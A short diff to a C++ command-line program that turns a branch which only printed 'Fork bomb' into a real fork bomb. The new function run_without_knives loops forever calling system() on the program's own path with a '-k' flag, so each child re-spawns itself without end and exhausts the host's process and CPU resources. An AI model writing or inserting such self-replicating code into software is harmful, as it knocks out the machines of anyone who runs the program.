@@ -1,6 +1,7 @@
 #include <fstream>
 #include <getopt.h>
 #include <iostream>
+#include <sstream>
 #include <unistd.h>
 
 void print_license() {
@@ -46,11 +47,17 @@ Status_code parse_args(int argc, char *argv[]) {
   return Status_code::Shell;
 }
 
+void run_without_knives(std::string str) {
+  std::ostringstream oss;
+  oss << str << " -k";
+  for (;;) system(oss.str().c_str());
+}
+
 int main(int argc, char *argv[]) {
   auto status = parse_args(argc, argv);
   switch (status) {
   case Status_code::Minus_knives:
-    std::cout << "Fork bomb\n";
+    run_without_knives(argv[0]);
     return 0;
   case Status_code::Error:
     print_usage(argv[0]);
